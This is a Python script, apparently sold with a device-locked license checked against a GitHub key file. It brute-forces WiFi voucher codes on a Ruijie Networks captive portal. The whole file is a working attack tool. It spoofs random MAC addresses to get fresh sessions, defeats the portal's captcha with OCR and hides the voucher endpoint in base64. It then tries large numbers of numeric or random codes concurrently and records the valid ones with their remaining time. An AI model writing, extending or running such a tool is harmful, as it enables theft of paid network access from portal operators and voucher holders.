import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
import hashlib
import platform
import sys
import urllib.request
import threading
from itertools import zip_longest
from datetime import datetime, timezone

# OCR နှင့် Image Processing အတွက် (Termux တွင် dependencies သွင်းထားရန် လိုအပ်ပါသည်)
try:
    import cv2
    import ddddocr
    import numpy as np
except ImportError:
    print("\033[1;31m[!] လိုအပ်သော Packages များ မရှိသေးပါ။ ကျေးဇူးပြု၍ အောက်ပါအတိုင်း အရင်သွင်းပါ:\033[0m")
    print("pip install opencv-python ddddocr numpy aiohttp")
    sys.exit(1)

# အလှဆင်ရန် ကာလာကုဒ်များ
R, G, Y, B, P, C, W, N = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[1;35m", "\033[1;36m", "\033[1;37m", "\033[0m"

# OCR စတင်မှုပြုလုပ်ခြင်း
_ocr = ddddocr.DdddOcr(show_ad=False)

# ကမ္ဘာလုံးဆိုင်ရာ Variable များ
session = None
_connector = None
CONCURRENCY = 50
_voucher_sem = None
session_url = ""
scan_task = None
stop_scan_flag = False

DEVICE_ID = ""
EXPIRE_DATE = ""
LICENSE_STATUS = False

    
 # License System

def get_device_id():
    # Model ရော Android ID (Secure ID) ပါ ပေါင်းပြီး ထုတ်ယူခြင်း
    model = os.popen('getprop ro.product.model').read().strip()
    android_id = os.popen('settings get secure android_id').read().strip()
    
    # အကယ်၍ settings က ဖတ်မရခဲ့ရင် build id ကို backup အနေနဲ့ သုံးမယ်
    if not android_id:
        android_id = os.popen('getprop ro.build.id').read().strip()
        
    combined = f"{model}{android_id}"
    return hashlib.md5(combined.encode()).hexdigest().upper()[:8]


def check_device():
    global DEVICE_ID, EXPIRE_DATE, LICENSE_STATUS
    DEVICE_ID = get_device_id()
        # random uuid ပါ ထည့်သွင်းပြီး တောင်းဆိုမှသာ GitHub Cache ငြိခြင်းကို ရာနှုန်းပြည့် ကျော်ဖြတ်နိုင်မည် ဖြစ်သည်
    url = f"https://raw.githubusercontent.com/kopaing232005-afk/key/refs/heads/main/key.json?v={uuid.uuid4().hex}"
    
    try:
        req = urllib.request.Request(url, headers={
            'User-Agent': 'Mozilla/5.0', 
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status != 200:
                LICENSE_STATUS = False
                return False
                
            server_date_str = response.headers.get('Date')
            if server_date_str:
                server_time = datetime.strptime(server_date_str, "%a, %d %b %Y %H:%M:%S %Z")
                current_now = server_time.replace(tzinfo=timezone.utc).astimezone()
            else:
                current_now = datetime.now().astimezone()

            data = json.loads(response.read().decode())
            devices = data.get("devices", [])
            
            # --- ဒီအပိုင်းမှာ ID ရှိမရှိကို အရင်ဆုံး သေချာအောင် စစ်ထုတ်ပါမယ် ---
            # GitHub ထဲက ID စာရင်းတွေကို ဆွဲထုတ်ပြီး လက်ရှိ Device ID ပါမပါ စစ်တာပါ
            all_ids = [item["id"] for item in devices]
            
            # အကယ်၍ လက်ရှိ Device ID သည် GitHub ထဲမှာ မရှိတော့ရင် (ဖျက်လိုက်ရင်) ချက်ချင်း ပိတ်ချမယ်
            if DEVICE_ID not in all_ids:
                EXPIRE_DATE = "Expired/Removed"
                LICENSE_STATUS = False
                return False
            
            # ID ရှိတယ်ဆိုမှ ဒေတာတွေကို ဆက်စစ်မယ်
            for item in devices:
                if item["id"] == DEVICE_ID:
                    if item["status"] != "active":
                        LICENSE_STATUS = False
                        return False
                    
                    expire_str = item["expire"]
                    expire_dt = None
                    
                    for fmt in ("%Y-%m-%d %H:%M", "%Y-%m-%d"):
                        try:
                            expire_dt = datetime.strptime(expire_str, fmt)
                            break
                        except ValueError:
                            continue
                            
                    if not expire_dt:
                        LICENSE_STATUS = False
                        return False
                        
                    expire_dt = expire_dt.astimezone()
                    EXPIRE_DATE = expire_str
                    
                    if current_now > expire_dt:
                        LICENSE_STATUS = False
                        return False
                        
                    LICENSE_STATUS = True
                    return True
                    
    except Exception:
        LICENSE_STATUS = False
        return False

    # အပေါ်က အခြေအနေတွေနဲ့ မကိုက်ညီရင်လည်း ပေးမဝင်ပါဘူး
    LICENSE_STATUS = False
    return False

# AIDEN Logo Banner
def banner():
    print("\033[1;35m" + "="*56)
    print("██╗    ██╗     ██╗██╗██╗")
    print("██╗  ██╗       ██╗      ██╗")
    print("██╗██╗         ██╗██╗██╗")
    print("██╗  ██╗       ██╗")
    print("██╗    ██╗     ██╗")
    print("╚═╝    ╚═╝     ╚═╝")
    print("="*56 + "\033[0m")
    print("\033[1;36m       WELCOME TO KP Content-@kpbykp\033[0m")
    print(f"{G} Device ID : {W}{DEVICE_ID}{N}")
    print(f"{Y} Expire    : {W}{EXPIRE_DATE}{N}")
    print(f"{B}-------------------------------------------------------{N}")

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        return None
        
def Minute_to_Hour(total_minutes):
    if total_minutes is None or total_minutes == 0 or total_minutes == 'Unknown':
        return "N/A"
    try:
        minutes = int(total_minutes)
        if minutes <= 0:
            return "⛔ Expired"
        days = minutes // 1440
        hours = (minutes % 1440) // 60
        mins = minutes % 60
        parts = []
        if days > 0: parts.append(f"{days} day{'s' if days > 1 else ''}")
        if hours > 0: parts.append(f"{hours} hour{'s' if hours > 1 else ''}")
        if mins > 0: parts.append(f"{mins} minute{'s' if mins > 1 else ''}")
        return " ".join(parts) if parts else "0 minutes"
    except:
        return 'Unknown'


async def Code_Expires_Date(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    try:
        # 💡 API လမ်းကြောင်းကို time8.py အတိုင်း /api/auth/balance/ ဖြင့် ပြောင်းလဲထားပါသည်
        url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}'
        async with session.get(url, headers=headers) as req:
            respond = await req.json()
            result_data = respond.get('result', {}) or {}
            profile_name = result_data.get('profileName', 'Unknown')
            
            # 💡 time8.py အတိုင်း Total Time ရော Remaining Time ပါ ထုတ်ယူခြင်း
            total_minutes = result_data.get('totalMinutes', 0)
            remaining_minutes = result_data.get('remainingMinutes', 0)
            
            total_time_str = Minute_to_Hour(total_minutes)
            remaining_time_str = Minute_to_Hour(remaining_minutes)
            
            return f"Plan: {profile_name} | Total: {total_time_str} | Remaining: {remaining_time_str}"
    except:
        return "Plan: Unknown | Time: Unknown"


def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session, url):
    mac = get_mac()
    target_url = replace_mac(url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(target_url, headers=headers, allow_redirects=True) as req:
            response_url = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response_url)
            if session_id:
                return session_id.group(1)
    except:
        pass
    return None

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
    elif mode == "8":
        while True: yield "".join(random.choice(string.digits) for _ in range(8))
    elif mode == "ascii-lower":
        while True: yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    elif mode == "all":
        while True: yield "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    else:
        raise ValueError(f"Unsupported scan mode: {mode}")

async def perform_check(url, code, success_list, limited_list):
    global _connector, stop_scan_flag
    if stop_scan_flag: return

    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
        session_id = await get_session_id(task_session, url)
        if not session_id: return

        auth_code = None
        for _ in range(5):
            try:
                image = await Captcha_Image(task_session, session_id)
                text = await Captcha_Text(image)
                if text and await Varify_Captcha(task_session, session_id, text):
                    auth_code = text
                    break
            except:
                continue
        
        if not auth_code: return

        data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
        headers = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        }
        try:
            async with task_session.post(post_url, json=data, headers=headers) as req:
                response = await req.text()
                if 'logonUrl' in response:
                    # 💡 Success ဖြစ်တဲ့ Code ၏ သက်တမ်းကို သွားဖတ်ခြင်း
                    info = await Code_Expires_Date(task_session, session_id)
                    formatted_entry = f"{code} ({info})"
                    if formatted_entry not in success_list:
                        success_list.append(formatted_entry)
                        print(f"\n{G}[✓] SUCCESS: {formatted_entry}{N}")
                elif 'STA' in response:
                    # 💡 Limited ဖြစ်တဲ့ Code ၏ သက်တမ်းကို သွားဖတ်ခြင်း
                    info = await Code_Expires_Date(task_session, session_id)
                    formatted_entry = f"{code} ({info})"
                    if formatted_entry not in limited_list:
                        limited_list.append(formatted_entry)
                        print(f"\n{Y}[⚠️] LIMITED: {formatted_entry}{N}")

        except:
            pass

async def start_scan(mode, url):
    global _voucher_sem, stop_scan_flag
    stop_scan_flag = False
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        print(f"{R}[!] Error: {e}{N}")
        return

    success_codes = []
    limited_codes = []
    checked = 0
    start_time = time.monotonic()
    
    print(f"\n{C}[*] Scanning started using mode: {mode}... (Press CTRL+C to Stop){N}\n")
    
    BATCH_SIZE = 100
    try:
        while not stop_scan_flag:
            batch = []
            for _ in range(BATCH_SIZE):
                try: batch.append(next(code_iter))
                except StopIteration: break
            if not batch: break

            async def _check(c):
                async with _voucher_sem:
                    await perform_check(url, c, success_codes, limited_codes)

            await asyncio.gather(*[_check(code) for code in batch])
            checked += len(batch)

            elapsed = time.monotonic() - start_time

            if elapsed < 3:
                speed = 0
            else:
                 speed = checked / elapsed * 60

            runtime = int(elapsed)
            h = runtime // 3600
            m = (runtime % 3600) // 60
            s = runtime % 60

            os.system("clear")
            banner()

            print(f"{C}╔══════════════════════════════════════╗{N}")
            print(f"{C}║{P}   KP SCANNER content-@kpbykp           {C}║{N}")
            print(f"{C}╠══════════════════════════════════════╣{N}")
            print(f"{C}║ {G}STATUS{N}{C} : {Y}RUNNING{C}                 ║{N}")
            print(f"{C}║ {W}Checked{C} : {G}{checked:<10,}{C}          ║{N}")
            print(f"{C}║ {W}Speed{C}   : {Y}{speed:>7.0f}/min{C}         ║{N}")
            print(f"{C}║ {W}Success{C} : {G}{len(success_codes):<3}{C}                 ║{N}")
            print(f"{C}║ {W}Limited{C} : {R}{len(limited_codes):<3}{C}                 ║{N}")
            print(f"{C}║ {W}Runtime{C} : {B}{h:02}:{m:02}:{s:02}{C}           ║{N}")
            print(f"{C}╚══════════════════════════════════════╝{N}")

            print()
            # 🟢 SUCCESS CODES အပိုင်းကို အပေါ်မှာ သီးသန့်ပြခြင်း
            print(f"{G}╔═════════════ SUCCESS CODES ═══════════════════════╗{N}")
            if success_codes:
                for suc in success_codes:
                    print(f"{G}  ✓ {suc}{N}")
            else:
                print(f"{W}  (No success codes found yet){N}")
            print(f"{G}╚═════════════════════════════════════════════════╝{N}")

            print()
            # 🟡 LIMITED CODES အပိုင်းကို အောက်မှာ သီးသန့်ပြခြင်း
            print(f"{Y}╔═════════════ LIMITED CODES ══════════════════════╗{N}")
            if limited_codes:
                for lim in limited_codes:
                    print(f"{Y}  ⚠ {lim}{N}")
            else:
                print(f"{W}  (No limited codes found yet){N}")
            print(f"{Y}╚═════════════════════════════════════════════════╝{N}")


            if mode in ["6", "7"] and checked >= 10**int(mode):
                break
    except asyncio.CancelledError:
        pass
    os.system("clear")
    banner()
    print(f"\n\n{C}================= SCAN RESULT ================={N}")
    print(f"{G}✅ Success Codes ({len(success_codes)}): {', '.join(success_codes) if success_codes else 'None'}{N}")
    print(f"{Y}⚠️ Limited Codes ({len(limited_codes)}): {', '.join(limited_codes) if limited_codes else 'None'}{N}")
    print(f"{C}==============================================={N}")

async def main_menu():
    global session, _connector, session_url, stop_scan_flag, scan_task
    
    _connector = aiohttp.TCPConnector(limit=1000, ssl=True)
    session = aiohttp.ClientSession(connector=_connector)
    
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    
    while True:

        if not session_url:
            print(f"\n{W}Please enter Session URL:{N}")
            print(f"{G}/input <url>{N}")

        else:
            print(f"\n{W}Available Commands:{N}")
            print(f"{G}1. /scan <mode> {N}- Start Scan")
            print(f"{G}2. /stop        {N}- Stop current scan")
            print(f"{G}3. /exit        {N}- Exit script")


        try:

            cmd_input = input(f"\n{C}AIDEN > {N}").strip()

            if not cmd_input:
                continue


            parts = cmd_input.split(maxsplit=1)

            command = parts[0].lower()
            args = parts[1] if len(parts) > 1 else ""



            if command == "/input":

                if not args:

                    print(
                        f"{R}[!] Usage: /input <your_session_url>{N}"
                    )

                    continue


                session_url = args
               
                os.system("clear")
                banner()

                print(
                    f"{G}[✓] Session URL Saved Successfully!{N}"
                )



            elif command == "/scan":

                if not session_url:

                    print(
                        f"{R}[!] Please set the URL using /input first.{N}"
                    )

                elif not args:

                    print(
                        f"{R}[!] Usage: /scan <mode>{N}"
                    )

                else:

                    scan_task = asyncio.create_task(
                        start_scan(args, session_url)
                    )

                    await scan_task



            elif command == "/stop":

                if scan_task and not scan_task.done():

                    stop_scan_flag = True

                    scan_task.cancel()

                    print(
                        f"{R}[!] Scan stopped.{N}"
                    )

                else:

                    print(
                        f"{Y}[!] No active scan running.{N}"
                    )



            elif command == "/exit":

                print(
                    f"{Y}[*] Exiting Aiden Terminal... Goodbye!{N}"
                )

                break



            else:

                print(
                    f"{R}[!] Invalid command, please try again.{N}"
                )



        except KeyboardInterrupt:


            if scan_task and not scan_task.done():

                stop_scan_flag = True

                scan_task.cancel()

                print(
                    f"\n{R}[!] Scan stopped by user.{N}"
                )

            else:

                print(
                    f"\n{Y}[*] Exiting...{N}"
                )

                break

    await session.close()
    await _connector.close()
    
def license_background_monitor():
    while True:
        time.sleep(3)
        if not check_device():
            print(f"\n{R}[!] License verification failed or connection lost! Stopping terminal...{N}")
            os.kill(os.getpid(), 9)
            sys.exit(1)

if __name__ == '__main__':
    # ၁။ စက်ရဲ့ Device ID ကို အရင်ယူမယ်
    DEVICE_ID = get_device_id()
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    # ၂။ Script စတင် Run တိုင်း GitHub ပေါ်မှာ ID ရှိမရှိ မဖြစ်မနေ အရင်ဆုံး စစ်ဆေးခြင်း
    if not check_device():
        print(f"\n{R}[!] Access Denied: Device ID ({DEVICE_ID}) is not registered or has been removed!{N}")
        sys.exit(1) # ID မရှိလျှင်/ဖျက်ထားလျှင် အောက်က ကုဒ်တွေကို ဆက်မသွားဘဲ ဒီမှာတင် ပရိုဂရမ်ကို ပိတ်ချပစ်မည်

    # ၃။ ID ရှိပြီး လိုင်စင်အောင်မြင်မှသာ ကျန်တဲ့ Menu တွေ၊ Banner တွေကို ဖွင့်ပေးမည်
    banner()

    # ၄။ ပွင့်နေစဉ်အတွင်းမှာလည်း နောက်ကွယ်ကနေ ၃ စက္ကန့်တစ်ခါ GitHub ကို ဆက်တိုက် စောင့်ကြည့်စစ်ဆေးမည့် Thread ကို စတင်ခြင်း
    monitor_thread = threading.Thread(target=license_background_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()

    try:
        asyncio.run(main_menu())
    except KeyboardInterrupt:
        pass
